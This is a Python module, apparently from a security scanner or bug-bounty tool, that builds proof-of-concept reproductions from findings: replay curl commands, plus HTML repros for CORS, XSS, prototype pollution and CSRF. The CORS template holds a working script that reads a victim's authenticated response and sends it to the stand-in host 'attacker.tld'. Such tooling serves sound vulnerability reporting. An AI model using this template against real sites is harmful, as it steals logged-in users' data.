"""Proof-of-concept generation.

A finding triages faster (and pays better) when it ships a copy-paste
reproduction. This builds, from a finding's recorded request, a ready `curl`
command and — for client-side classes — a minimal HTML repro. Pure and
string-only so it unit-tests offline; the reporting layer renders the result.
"""
from __future__ import annotations

import shlex
from typing import Any
from urllib.parse import urlparse

from .injection import parse_point
from .utils import merge_query

# client-side classes get an HTML repro instead of a curl
_CLIENT_SIDE = {"xss", "dom_xss", "stored_xss", "cors", "prototype_pollution", "csrf"}


def build_curl(finding: dict[str, Any]) -> str:
    """Reconstruct a curl command that reproduces the finding's request."""
    url = finding.get("url") or ""
    method = _method(finding)
    param = finding.get("parameter") or ""
    payload = finding.get("payload") or ""
    kind, loc = parse_point(param) if param and ":" in param else ("query", param)

    headers: list[str] = []
    data = None
    target = url

    if param and payload:
        if kind == "header":
            headers.append(f"{loc}: {payload}")
        elif kind == "cookie":
            headers.append(f"Cookie: {loc}={payload}")
        elif kind == "json":
            data = f'{{"{loc}": "{payload}"}}'
            headers.append("Content-Type: application/json")
        elif kind == "query" and method == "GET" and loc and not loc.startswith("("):
            target = merge_query(url, {loc: payload})
        elif method in ("POST", "PUT", "PATCH") and loc and not loc.startswith("("):
            data = f"{loc}={payload}"

    parts = ["curl", "-sk", "-i"]
    if method != "GET":
        parts += ["-X", method]
    for h in headers:
        parts += ["-H", shlex.quote(h)]
    if data is not None:
        parts += ["--data", shlex.quote(data)]
    parts.append(shlex.quote(target))
    note = ""
    if finding.get("metadata", {}).get("session_a") or "auth" in (finding.get("evidence") or "").lower():
        note = "   # add the victim's session cookie/Authorization header to reproduce"
    return " ".join(parts) + note


def build_repro(finding: dict[str, Any]) -> str:
    """HTML repro for client-side bugs, else the curl command."""
    cat = (finding.get("category") or "").lower()
    url = finding.get("url") or ""
    if cat == "cors":
        return (
            "<!doctype html><script>\n"
            f"// Host on attacker.tld, open while logged in to {urlparse(url).netloc}\n"
            f"fetch('{url}', {{credentials:'include'}})\n"
            "  .then(r => r.text())\n"
            "  .then(d => new Image().src='https://attacker.tld/x?'+encodeURIComponent(d));\n"
            "</script>")
    if cat in ("xss", "stored_xss", "dom_xss"):
        return f"<!-- Visit while authenticated -->\n{url}\n<!-- payload: {finding.get('payload','')} -->"
    if cat == "prototype_pollution":
        return f"{url}\n// then check Object.prototype in DevTools console"
    if cat == "csrf":
        return (f'<form action="{url}" method="POST">\n'
                '  <!-- attacker-controlled fields here -->\n'
                '  <input type="submit">\n</form>')
    return build_curl(finding)


def annotate_poc(finding: dict[str, Any]) -> None:
    """Attach poc_curl + poc to a finding in place (best-effort)."""
    try:
        finding["poc_curl"] = build_curl(finding)
        repro = build_repro(finding)
        if repro and not finding.get("poc"):
            finding["poc"] = repro
    except Exception:
        pass


def _method(finding: dict[str, Any]) -> str:
    req = (finding.get("request") or "").strip()
    if req:
        head = req.split(None, 1)[0].upper()
        if head in ("GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"):
            return head
    m = (finding.get("metadata") or {}).get("method")
    return (m or "GET").upper()
